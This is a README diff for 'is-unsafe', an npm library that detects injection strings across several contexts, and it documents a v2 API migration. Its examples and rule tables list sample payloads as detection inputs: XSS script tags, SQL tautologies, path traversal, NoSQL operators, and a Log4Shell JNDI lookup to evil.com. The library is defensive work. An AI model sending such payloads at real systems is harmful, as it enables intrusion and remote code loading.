@@ -1,6 +1,6 @@
 # `is-unsafe`
 
-> Zero-dependency, DOM-free, pure predicate for detecting unsafe strings across HTML, XML, SVG, SQL, SQL-STRICT, SHELL, REDOS, NOSQL, and LOG contexts.
+> Zero-dependency, DOM-free, tree-shakeable pure predicate for detecting unsafe strings across HTML, XML, SVG, SQL, SQL-STRICT, SHELL, REDOS, NOSQL, and LOG contexts.
 
 [![npm version](https://img.shields.io/npm/v/is-unsafe.svg)](https://www.npmjs.com/package/is-unsafe)
 [![license](https://img.shields.io/npm/l/is-unsafe.svg)](LICENSE)
@@ -46,17 +46,32 @@ npm install is-unsafe
 ## Quick start
 
 ```js
-import { isUnsafe } from 'is-unsafe';
+import { isUnsafe, HTML, SQL, SHELL, REDOS, NOSQL, LOG } from 'is-unsafe';
 
-isUnsafe('<script>alert(1)</script>', 'HTML')     // → true
-isUnsafe('New York, NY',             'HTML')     // → false
+isUnsafe('<script>alert(1)</script>', HTML)    // → true
+isUnsafe('New York, NY',             HTML)    // → false
 
-isUnsafe("' OR 1=1--",               'SQL')      // → true
-isUnsafe('../etc/passwd',            'SHELL')    // → true
-isUnsafe('(a+)+',                    'REDOS')    // → true  (ReDoS risk)
-isUnsafe('{"$ne": null}',            'NOSQL')    // → true
-isUnsafe('${jndi:ldap://evil.com}',  'LOG')      // → true  (Log4Shell)
+isUnsafe("' OR 1=1--",              SQL)      // → true
+isUnsafe('../etc/passwd',           SHELL)    // → true
+isUnsafe('(a+)+',                   REDOS)    // → true  (ReDoS risk)
+isUnsafe('{"$ne": null}',           NOSQL)    // → true
+isUnsafe('${jndi:ldap://evil.com}', LOG)      // → true  (Log4Shell)
 ```
+
+---
+
+## v2 Migration guide
+
+v2 replaces string context names with **imported pattern arrays**. This is the only breaking change.
+
+| v1 | v2 |
+|----|----|
+| `import { isUnsafe, VALID_CONTEXTS } from 'is-unsafe'` | `import { isUnsafe, HTML, XML } from 'is-unsafe'` |
+| `isUnsafe(v, 'HTML')` | `isUnsafe(v, HTML)` |
+| `isUnsafe(v, ['HTML', 'XML'])` | `isUnsafe(v, [HTML, XML])` |
+| `for (const ctx in VALID_CONTEXTS) { isUnsafe(v, ctx) }` | `for (const ctx of Object.values(VALID_CONTEXTS)) { isUnsafe(v, ctx) }` |
+
+**Why the change?** String names required a central registry that imported all 9 context modules unconditionally. Even if you only used `HTML` and `XML`, your bundle included all contexts (~22 KB dead weight). With named imports, bundlers include only what you actually import.
 
 ---
 
@@ -69,14 +84,16 @@ Returns `true` if `value` is unsafe in the given context, `false` otherwise.
 | Parameter | Type | Description |
 |-----------|------|-------------|
 | `value` | `string` | The string to test. Throws `TypeError` if not a string. |
-| `context` | `string \| string[] \| RegExp` | Context name, array of context names, or a custom `RegExp`. |
+| `context` | `PatternList \| PatternList[] \| RegExp` | A named context import, array of context imports, or a custom `RegExp`. |
 
 ```js
+import { isUnsafe, HTML, XML } from 'is-unsafe';
+
 // Single context
-isUnsafe(value, 'HTML')
+isUnsafe(value, HTML)
 
 // Multiple contexts — true if unsafe in ANY of them
-isUnsafe(value, ['HTML', 'XML'])
+isUnsafe(value, [HTML, XML])
 
 // Custom RegExp — true if pattern matches
 isUnsafe(value, /my-pattern/i)
@@ -89,9 +106,9 @@ isUnsafe(value, /my-pattern/i)
 Like `isUnsafe`, but returns a `MatchResult` object describing the **first** matching rule, or `null` if the value is safe. Useful for logging and error messages.
 
 ```js
-import { whyUnsafe } from 'is-unsafe';
+import { whyUnsafe, HTML } from 'is-unsafe';
 
-const result = whyUnsafe('<script>alert(1)</script>', 'HTML');
+const result = whyUnsafe('<script>alert(1)</script>', HTML);
 // {
 //   context:     'HTML',
 //   id:          'html-script-open',
@@ -107,9 +124,9 @@ const result = whyUnsafe('<script>alert(1)</script>', 'HTML');
 Returns **all** matching rules across the given context(s), or an empty array if safe. Useful for comprehensive audits.
 
 ```js
-import { allUnsafe } from 'is-unsafe';
+import { allUnsafe, HTML } from 'is-unsafe';
 
-const findings = allUnsafe('<script onload="x"></script>', 'HTML');
+const findings = allUnsafe('<script onload="x"></script>', HTML);
 // [
 //   { context: 'HTML', id: 'html-script-open',          ... },
 //   { context: 'HTML', id: 'html-script-close',         ... },
@@ -119,30 +136,70 @@ const findings = allUnsafe('<script onload="x"></script>', 'HTML');
 
 ---
 
+### Named context exports
+
+Each context is a named export. Import only what your code uses — unused contexts are dropped by your bundler.
+
+```js
+import { HTML, XML, SVG, SQL, SQL_STRICT, SHELL, REDOS, NOSQL, LOG } from 'is-unsafe';
+```
+
+Note: `SQL-STRICT` is exported as `SQL_STRICT` (hyphens are not valid in JS identifiers).
+
+---
+
+### Custom `PatternList`
+
+You can supply your own pattern list alongside or instead of the built-in contexts:
+
+```js
+import { isUnsafe, whyUnsafe, HTML } from 'is-unsafe';
+
+const INTERNAL_RULES = [
+  { id: 'no-internal-ref', description: 'Blocks references to internal hostnames', pattern: /\.internal\b/i },
+  { id: 'no-admin-path',   description: 'Blocks paths starting with /admin',        pattern: /\/admin\b/i   },
+];
+
+// Optional — sets the context label in MatchResult. Defaults to 'CUSTOM'.
+INTERNAL_RULES.label = 'INTERNAL';
+
+isUnsafe('https://api.internal/data', INTERNAL_RULES)  // true
+isUnsafe('https://example.com/page',  INTERNAL_RULES)  // false
+
+// Mix with built-in contexts
+isUnsafe(value, [HTML, INTERNAL_RULES]);
+
+const result = whyUnsafe('https://api.internal/admin', INTERNAL_RULES);
+// { context: 'INTERNAL', id: 'no-internal-ref', description: '...', pattern: /.../ }
+```
+
+Without setting `.label`, `MatchResult.context` will be `'CUSTOM'`.
+
+---
+
 ### `VALID_CONTEXTS`
 
-Exported array of all built-in context names.
+A convenience object that re-exports all contexts under their canonical names. Useful for tooling or exhaustive checks across all contexts.
+
+> **Warning:** importing `VALID_CONTEXTS` pulls in all 9 context modules. If your bundle size matters and you only need a few contexts, import them individually instead.
 
 ```js
 import { VALID_CONTEXTS } from 'is-unsafe';
-// {
-//     readonly HTML: "HTML";
-//     readonly XML: "XML";
-//     readonly SVG: "SVG";
-//     readonly SQL: "SQL";
-//     readonly "SQL-STRICT": "SQL-STRICT";
-//     readonly SHELL: "SHELL";
-//     readonly REDOS: "REDOS";
-//     readonly NOSQL: "NOSQL";
-//     readonly LOG: "LOG";
-// }
+
+// { HTML: [...], XML: [...], SVG: [...], SQL: [...], 'SQL-STRICT': [...],
+//   SHELL: [...], REDOS: [...], NOSQL: [...], LOG: [...] }
+
+// Iterate all contexts:
+for (const [name, ctx] of Object.entries(VALID_CONTEXTS)) {
+  if (isUnsafe(value, ctx)) console.log(`Unsafe in ${name}`);
+}
 ```
 
 ---
 
 ## Contexts
 
-### `'HTML'`
+### `HTML`
 
 XSS vectors when a string is rendered as HTML:
 
@@ -168,7 +225,7 @@ XSS vectors when a string is rendered as HTML:
 
 ---
 
-### `'XML'`
+### `XML`
 
 Parser-level attacks in XML documents (distinct from HTML XSS):
 
@@ -189,7 +246,7 @@ Parser-level attacks in XML documents (distinct from HTML XSS):
 
 ---
 
-### `'SVG'`
+### `SVG`
 
 SVG-specific XSS vectors that bypass HTML-only sanitizers (including documented DOMPurify bypass patterns):
 
@@ -210,15 +267,15 @@ SVG-specific XSS vectors that bypass HTML-only sanitizers (including documented 
 
 ---
 
-### `'SQL'` and `'SQL-STRICT'`
+### `SQL` and `SQL_STRICT`
 
 Two tiers of SQL injection detection, chosen based on what kind of input you're validating.
 
-**Use `'SQL'`** for general user-facing fields (names, descriptions, search queries). Its 15 rules are high-precision with very low false-positive risk.
+**Use `SQL`** for general user-facing fields (names, descriptions, search queries). Its 15 rules are high-precision with very low false-positive risk.
 
-**Use `'SQL-STRICT'`** when the input is specifically a SQL fragment or database identifier — it includes all `SQL` rules plus three additional rules that would produce false positives on general text:
+**Use `SQL_STRICT`** when the input is specifically a SQL fragment or database identifier — it includes all `SQL` rules plus three additional rules that would produce false positives on general text:
 
-| Extra rule in SQL-STRICT | Why it's noisy on general text |
+| Extra rule in SQL_STRICT | Why it's noisy on general text |
 |--------------------------|-------------------------------|
 | `sql-line-comment` (`--`) | Fires on `"see note -- above"`, CSS `var(--primary)` |
 | `sql-stacked-query` (`;SELECT`) | Semicolons are normal punctuation |
@@ -228,77 +285,62 @@ Two tiers of SQL injection detection, chosen based on what kind of input you're 
 
 | Rule ID | What it catches |
 |---------|----------------|
-| `sql-block-comment-open` | `/*` block comment |
-| `sql-union-select` | `UNION SELECT`, `UNION ALL SELECT` |
+| `sql-block-comment` | `/*` — comment-based bypass |
+| `sql-union-select` | `UNION SELECT` — data extraction |
+| `sql-tautology-or` | `OR 1=1`, `OR 'a'='a'` — always-true bypass |
+| `sql-tautology-and` | `AND 1=1`, `AND 'a'='a'` |
+| `sql-quote-escape` | `\'` or `''` — string termination attempts |
 | `sql-drop-table` | `DROP TABLE` |
-| `sql-drop-database` | `DROP DATABASE` |
 | `sql-insert-into` | `INSERT INTO` |
 | `sql-delete-from` | `DELETE FROM` |
 | `sql-update-set` | `UPDATE ... SET` |
-| `sql-exec-xp` | `EXEC xp_` — MSSQL extended stored procedures |
-| `sql-tautology-string` | `' OR '1'='1` string tautologies |
-| `sql-tautology-numeric` | `OR 1=1` numeric tautology |
-| `sql-always-true-zero` | `OR 0=0` numeric tautology |
-| `sql-sleep-benchmark` | `SLEEP()`, `BENCHMARK()` — time-based blind injection |
-| `sql-waitfor-delay` | `WAITFOR DELAY` — MSSQL time-based blind |
-| `sql-char-function` | `CHAR(65)` — character obfuscation |
-| `sql-information-schema` | `INFORMATION_SCHEMA` — reconnaissance |
+| `sql-exec-xp` | `EXEC xp_` — SQL Server extended procedures |
+| `sql-sleep-waitfor` | `SLEEP(` / `WAITFOR DELAY` — time-based blind injection |
+| `sql-cast-convert` | `CAST(` / `CONVERT(` — obfuscation |
+| `sql-char-function` | `CHAR(` — ASCII character encoding |
+| `sql-information-schema` | `INFORMATION_SCHEMA` — metadata extraction |
+| `sql-load-file` | `LOAD_FILE(` / `INTO OUTFILE` — file system access |
 
 ---
 
-### `'SHELL'`
+### `SHELL`
 
-Shell injection and path traversal:
+Shell injection and path traversal vectors:
 
 | Rule ID | What it catches |
 |---------|----------------|
-| `shell-path-traversal-unix` | `../` directory traversal |
-| `shell-path-traversal-windows` | `..\` Windows traversal |
-| `shell-path-traversal-encoded` | `%2e%2e` URL-encoded traversal |
-| `shell-null-byte` | `\x00` or `%00` null byte injection |
-| `shell-semicolon` | `;` command separator |
-| `shell-pipe` | `\|` pipe operator |
-| `shell-and-operator` | `&&` AND operator |
-| `shell-or-operator` | `\|\|` OR operator |
-| `shell-backtick` | `` ` `` backtick substitution |
-| `shell-dollar-paren` | `$(cmd)` command substitution |
-| `shell-dollar-brace` | `${var}` variable expansion |
-| `shell-redirect-out` | `>` or `>>` output redirection |
-| `shell-redirect-in` | `<` input redirection |
-| `shell-newline-injection` | `\n` or `\r` newline injection |
-| `shell-glob-star` | `/*` or `\*` glob after path separator |
-| `shell-absolute-root` | Strings starting with `/` or `\\` (UNC) |
-| `shell-windows-drive` | `C:\` or `D:/` Windows drive paths |
-| `shell-curl-wget` | `curl https://...` or `wget -` with URL or flags |
-
-> **Note:** The `SHELL` context is intentionally broad. Characters like `;`, `|`, and `<` appear in many safe strings, so apply this context only to values destined for shell execution or filesystem operations, not to general text.
+| `shell-path-traversal-unix` | `../` — Unix directory traversal |
+| `shell-path-traversal-win` | `..\` — Windows directory traversal |
+| `shell-absolute-path-unix` | Leading `/` — absolute Unix path |
+| `shell-absolute-path-win` | `C:\` / `D:\` etc. — absolute Windows path |
+| `shell-null-byte` | `\x00` or `%00` — null byte injection |
+| `shell-command-subst` | `` `cmd` `` / `$(cmd)` — command substitution |
+| `shell-pipe` | `|` — command piping |
+| `shell-semicolon` | `;` — command chaining |
+| `shell-ampersand` | `&&` / `&` — background / logical AND |
+| `shell-redirect` | `>` / `>>` / `<` — I/O redirection |
 
 ---
 
-### `'REDOS'`
+### `REDOS`
 
-Strings that would cause catastrophic backtracking if compiled as a `RegExp`:
+Patterns dangerous when compiled as a RegExp (catastrophic backtracking):
 
 | Rule ID | What it catches |
 |---------|----------------|
-| `redos-nested-quantifier-plus` | `(a+)+`, `(.+b)*` — nested `+` in group with outer quantifier |
-| `redos-nested-quantifier-star` | `(a*)*` — nested `*` in group with outer quantifier |
-| `redos-nested-groups` | `((a+)+)` — doubly nested quantified groups |
-| `redos-alternation-overlap` | `(a\|a)+` — repeated identical alternatives |
-| `redos-star-plus-concat` | `(a*a)+` — star-concat pattern |
-| `redos-dot-star-greedy` | `(.*){n}` — repeated greedy dot |
-| `redos-large-repetition` | `{1000,}` or `{5000,10000}` — extremely large repetition counts |
-| `redos-catastrophic-alternation` | 10+ pipe alternatives in one group |
+| `redos-nested-quantifier` | `(a+)+`, `(a*)*` — nested quantifiers |
+| `redos-overlapping-alternation` | `(a|a)+` — ambiguous alternation |
+| `redos-star-plus-adjacent` | `a*+` / `(a+)*` — adjacent unbounded quantifiers |
 
 ---
 
-### `'NOSQL'`
+### `NOSQL`
 
 MongoDB query operator injection and prototype pollution:
 
 | Rule ID | What it catches |
 |---------|----------------|
-| `nosql-where-operator` | `$where:` — executes arbitrary JavaScript server-side |
+| `nosql-where-operator` | `$where:` — server-side JS execution |
 | `nosql-ne-operator` | `$ne:` — not-equal authentication bypass |
 | `nosql-gt-operator` | `$gt:` / `$gte:` — greater-than bypass |
 | `nosql-lt-operator` | `$lt:` / `$lte:` — less-than bypass |
@@ -319,7 +361,7 @@ Patterns handle both bare form (`$ne: null`) and JSON key form (`{"$ne": null}`)
 
 ---
 
-### `'LOG'`
+### `LOG`
 
 Injection vectors dangerous when a string is written to a log file or passed to a logging framework:
 
@@ -344,16 +386,16 @@ Injection vectors dangerous when a string is written to a log file or passed to 
 
 ## Integration examples
 
-### `@nodable/entities` — `postCheck` callback
+### `@nodable/entities` — `postCheck` callback (the motivating use case)
 
 ```js
-import { isUnsafe } from 'is-unsafe';
+import { isUnsafe, HTML } from 'is-unsafe';
 import { EntityDecoder, ALL_ENTITIES } from '@nodable/entities';
 
 const dec = new EntityDecoder({
   namedEntities: ALL_ENTITIES,
   postCheck: (resolved, original) => {
-    if (isUnsafe(resolved, 'HTML')) {
+    if (isUnsafe(resolved, HTML)) {
       return original;               // keep literal &entity; reference
       // or: throw new Error(`Unsafe entity blocked: ${original}`);
       // or: return '[BLOCKED]';
@@ -363,15 +405,28 @@ const dec = new EntityDecoder({
 });
 ```
 
+Only `html.js` ends up in your bundle — `XML`, `SQL`, and all other contexts are excluded automatically.
+
+### `fast-xml-parser` — entity check for HTML + XML contexts
+
+```js
+import { isUnsafe, HTML, XML } from 'is-unsafe';
+
+onInputEntity: (name, value) =>
+  isUnsafe(value, [HTML, XML]) ? ENTITY_ACTION.BLOCK : ENTITY_ACTION.ALLOW,
+```
+
+Bundle cost: only `html.js` + `xml.js` (~5.8 KB).
+
 ### Logging with `whyUnsafe`
 
 ```js
-import { isUnsafe, whyUnsafe } from 'is-unsafe';
+import { isUnsafe, whyUnsafe, HTML, SQL } from 'is-unsafe';
 
 function safeInsert(value, context) {
   if (isUnsafe(value, context)) {
     const reason = whyUnsafe(value, context);
-    logger.warn('Blocked unsafe value', { ruleId: reason.id, context });
+    logger.warn('Blocked unsafe value', { ruleId: reason.id, context: reason.context });
     throw new Error(`Unsafe value rejected (${reason.id})`);
   }
   return value;
@@ -381,42 +436,42 @@ function safeInsert(value, context) {
 ### Auditing with `allUnsafe`
 
 ```js
-import { allUnsafe } from 'is-unsafe';
+import { allUnsafe, HTML, SQL, SHELL } from 'is-unsafe';
 
-const findings = allUnsafe(userInput, ['HTML', 'SQL', 'SHELL']);
+const findings = allUnsafe(userInput, [HTML, SQL, SHELL]);
 if (findings.length > 0) {
   auditLog.record({ input: userInput, findings: findings.map(f => f.id) });
 }
 ```
 
-### SQL vs SQL-STRICT — choosing the right tier
+### SQL vs SQL_STRICT — choosing the right tier
 
 ```js
-import { isUnsafe } from 'is-unsafe';
+import { isUnsafe, SQL, SQL_STRICT } from 'is-unsafe';
 
 // General text field (name, description, comment) — use SQL
 function validateUserBio(bio) {
-  if (isUnsafe(bio, 'SQL')) throw new Error('Invalid content');
+  if (isUnsafe(bio, SQL)) throw new Error('Invalid content');
   return bio;
 }
 
-// Dedicated SQL identifier input (table name picker, column filter) — use SQL-STRICT
+// Dedicated SQL identifier input (table name picker, column filter) — use SQL_STRICT
 function validateTableName(name) {
-  if (isUnsafe(name, 'SQL-STRICT')) throw new Error('Invalid identifier');
+  if (isUnsafe(name, SQL_STRICT)) throw new Error('Invalid identifier');
   return name;
 }
 
 validateUserBio("see note -- above");  // passes (-- alone is fine for general text)
-validateTableName("users -- comment"); // blocked by SQL-STRICT
+validateTableName("users -- comment"); // blocked by SQL_STRICT
 ```
 
 ### File upload path guard
 
 ```js
-import { isUnsafe } from 'is-unsafe';
+import { isUnsafe, SHELL } from 'is-unsafe';
 
 function validateUploadPath(filename) {
-  if (isUnsafe(filename, 'SHELL')) throw new Error('Invalid filename');
+  if (isUnsafe(filename, SHELL)) throw new Error('Invalid filename');
   return filename;
 }
 
@@ -428,11 +483,11 @@ validateUploadPath('file.txt\x00.jpg');      // throws (null byte)
 ### User-supplied regex guard
 
 ```js
-import { isUnsafe, whyUnsafe } from 'is-unsafe';
+import { isUnsafe, whyUnsafe, REDOS } from 'is-unsafe';
 
 function compileUserRegex(pattern) {
-  if (isUnsafe(pattern, 'REDOS')) {
-    const detail = whyUnsafe(pattern, 'REDOS');
+  if (isUnsafe(pattern, REDOS)) {
+    const detail = whyUnsafe(pattern, REDOS);
     throw new Error(`ReDoS risk in pattern (${detail.id})`);
   }
   return new RegExp(pattern);
@@ -445,10 +500,10 @@ compileUserRegex('(a+)+');      // throws — nested quantifier
 ### MongoDB input guard
 
 ```js
-import { isUnsafe } from 'is-unsafe';
+import { isUnsafe, NOSQL } from 'is-unsafe';
 
 function safeMongoValue(value) {
-  if (isUnsafe(value, 'NOSQL')) throw new Error('Unsafe MongoDB value');
+  if (isUnsafe(value, NOSQL)) throw new Error('Unsafe MongoDB value');
   return value;
 }
 
@@ -460,10 +515,10 @@ safeMongoValue('__proto__');        // throws — prototype pollution
 ### Log field guard
 
 ```js
-import { isUnsafe } from 'is-unsafe';
+import { isUnsafe, LOG } from 'is-unsafe';
 
 function safeLogField(value) {
-  if (isUnsafe(value, 'LOG')) throw new Error('Unsafe log value');
+  if (isUnsafe(value, LOG)) throw new Error('Unsafe log value');
   return value;
 }
 
@@ -471,6 +526,20 @@ safeLogField('alice');                      // OK
 safeLogField('${jndi:ldap://evil.com}');    // throws — Log4Shell
 safeLogField("value\nfake log entry");      // throws — CRLF injection
 ```
+
+### Checking all contexts (tooling / security scanners)
+
+```js
+import { isUnsafe, VALID_CONTEXTS } from 'is-unsafe';
+
+for (const [name, ctx] of Object.entries(VALID_CONTEXTS)) {
+  if (isUnsafe(value, ctx)) {
+    console.log(`Unsafe in ${name}`);
+  }
+}
+```
+
+> Note: this import brings in all 9 context modules. Fine for CLI tools and scanners; use individual named imports in application bundles.
 
 ---
 
@@ -480,9 +549,11 @@ safeLogField("value\nfake log entry");      // throws — CRLF injection
 |-----------|--------|
 | **Predicate only** | Returns `true`/`false`. Never mutates strings. |
 | **Zero dependencies** | No jsdom, no DOM, no framework coupling. |
+| **Tree-shakeable** | Each context is an independent named export. Unused contexts are dropped by bundlers. |
 | **Context-aware** | "Unsafe" is not absolute — it depends on where the value will be used. |
 | **Caller decides action** | `is-unsafe` classifies. Escaping, throwing, or logging is the caller's responsibility. |
 | **ReDoS-safe** | All detection patterns use bounded quantifiers. The irony of a security package triggering its own vulnerability (as the `sql-injection` npm package does) is avoided by design. |
+| **Extensible** | Custom `PatternList` arrays work alongside built-in contexts. Set `.label` on your list to get meaningful context names in `MatchResult`. |
 | **False positives over false negatives** | In parser context, blocking a legitimate value is better than passing a malicious one. |
 
 ---
@@ -506,7 +577,7 @@ safeLogField("value\nfake log entry");      // throws — CRLF injection
 | `xss-checker` | 465 kB payload list, 6 years abandoned, 5 dependents. |
 | `is-sql-injection` | Philosophically closest, but v1.0.0 only, 8 years abandoned, 19 dependents. |
 | `sql-injection` | Express middleware. Has an active ReDoS CVE on its own detection patterns. |
-| **`is-unsafe`** | Actively maintained. DOM-free. Pure predicate. Covers HTML, XML, SVG, SQL (two tiers), SHELL, REDOS, NOSQL, and LOG as distinct contexts. |
+| **`is-unsafe`** | Actively maintained. DOM-free. Pure predicate. Tree-shakeable. Covers HTML, XML, SVG, SQL (two tiers), SHELL, REDOS, NOSQL, and LOG as distinct contexts. |
 
 The `SVG` context is the key differentiator for XSS — no existing package covers SVG-specific vectors (`xlink:href`, `foreignObject`, `animate`/`set` element attacks). The `XML` context covers parser-level attacks that DOMPurify has documented bypass vulnerabilities for. The `NOSQL` and `LOG` contexts (including Log4Shell) have no equivalent in any current predicate package.
 
